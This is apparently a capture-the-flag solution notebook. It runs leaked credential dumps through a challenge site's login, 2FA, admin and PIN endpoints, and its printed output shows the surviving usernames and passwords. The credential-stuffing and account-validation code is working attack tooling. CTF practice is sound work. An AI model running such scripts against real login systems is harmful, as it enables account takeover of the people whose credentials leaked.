{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import csv\n",
    "import re\n",
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "HOST = \"challenges.challenge-ecw.eu\"\n",
    "PORT = \"39099\"\n",
    "\n",
    "BASE = f\"http://{HOST}:{PORT}/\"\n",
    "\n",
    "LOGIN_URL   = f\"{BASE}controllers/db_controller.php?func=login\"\n",
    "PROFILE_URL = f\"{BASE}controllers/authentication_redirect.php?page=profile\"\n",
    "ADMIN_URL   = f\"{BASE}views/admin.php\"\n",
    "PIN_URL     = f\"{BASE}controllers/db_controller.php?func=enterPin\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "884\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = []\n",
    "\n",
    "with open(\"./dump-2024-08-20.csv\") as file:\n",
    "    csv_reader = csv.reader(file, delimiter=\";\")\n",
    "\n",
    "    for row in csv_reader:\n",
    "        ACCOUNTS.append(row)\n",
    "\n",
    "print(len(ACCOUNTS))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def filter_accounts(foo):\n",
    "    '''\n",
    "    Keeps only the accounts for which foo is true\n",
    "    '''\n",
    "    res = []\n",
    "    l = len(ACCOUNTS)\n",
    "    for row in ACCOUNTS:\n",
    "        if foo(row[0], row[1]):\n",
    "            res.append(row)\n",
    "    print(f\"{l - len(res)} accounts were removed\")\n",
    "    return res"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Obviously fake accounts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def rm_fakes(_, password):\n",
    "    return (re.match(\".*[hH][oO0][nN][eE3][yY]\", password) is None) and (\n",
    "        re.match(\".*[fF][aA@4][kK][eE3]\", password) is None\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "37 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_fakes)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Accounts that can't login"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def rm_no_login(username, password):\n",
    "    response = requests.post(LOGIN_URL, data={\"username\": username, \"password\": password})\n",
    "    return \"Wrong username or password!\" not in response.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "578 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_no_login)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Accounts that don't have 2 factor auth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "def rm_no_2fa(username, password):\n",
    "    session = requests.Session()\n",
    "    session.post(LOGIN_URL, data={\"username\": username, \"password\": password})\n",
    "    response = session.get(PROFILE_URL)\n",
    "    return \"Enter Your 8-Digit PIN\" in response.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "11 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_no_2fa)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Accounts that don't have admin access"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def rm_no_admin(username, password):\n",
    "    session = requests.Session()\n",
    "    session.post(LOGIN_URL, data={\"username\": username, \"password\": password})\n",
    "    response = session.get(ADMIN_URL)\n",
    "    return \"Forbidden\" not in response.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "257 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_no_admin)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[['admin-lilewis', 'CwDydHrVW@juR']]\n"
     ]
    }
   ],
   "source": [
    "print(ACCOUNTS)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Filter the second dump"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "ACCOUNTS = []\n",
    "\n",
    "with open(\"./dump-2024-08-27.csv\") as file:\n",
    "    csv_reader = csv.reader(file, delimiter=\";\")\n",
    "\n",
    "    for row in csv_reader:\n",
    "        ACCOUNTS.append(row)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "OLD_ACCOUNTS = []\n",
    "\n",
    "with open(\"./dump-2024-08-20.csv\") as file:\n",
    "    csv_reader = csv.reader(file, delimiter=\";\")\n",
    "\n",
    "    for row in csv_reader:\n",
    "        OLD_ACCOUNTS.append(row)\n",
    "\n",
    "def rm_old(username, password):\n",
    "    return [username, password] not in OLD_ACCOUNTS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "884 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_old)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "3 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_fakes)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "18 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_no_login)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "ACCOUNTS = filter_accounts(rm_no_2fa)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "4 accounts were removed\n",
      "[['admin-romason', 'vKfUMFwlMffDU'], ['admin-jidavis', 'fjbpfOZ@l0PnD']]\n"
     ]
    }
   ],
   "source": [
    "ADMINS = filter_accounts(rm_no_admin)\n",
    "print(ADMINS)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Accounts with the correct PIN"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "PIN = [3, 5, 2, 6, 8, 7, 1, 3]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "def rm_wrong_pin(username, password):\n",
    "    session = requests.Session()\n",
    "    session.post(LOGIN_URL, data={\"username\": username, \"password\": password})\n",
    "\n",
    "    response = session.post(\n",
    "        PIN_URL,\n",
    "        data={\n",
    "            \"1\": PIN[0],\n",
    "            \"2\": PIN[1],\n",
    "            \"3\": PIN[2],\n",
    "            \"4\": PIN[3],\n",
    "            \"5\": PIN[4],\n",
    "            \"6\": PIN[5],\n",
    "            \"7\": PIN[6],\n",
    "            \"8\": PIN[7],\n",
    "        },\n",
    "    )\n",
    "\n",
    "    return \"Wrong pin!\" not in response.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5 accounts were removed\n"
     ]
    }
   ],
   "source": [
    "TARGET = filter_accounts(rm_wrong_pin)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[['jasmith', 'HIR*0dVS!MygZ']]\n"
     ]
    }
   ],
   "source": [
    "print(TARGET)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
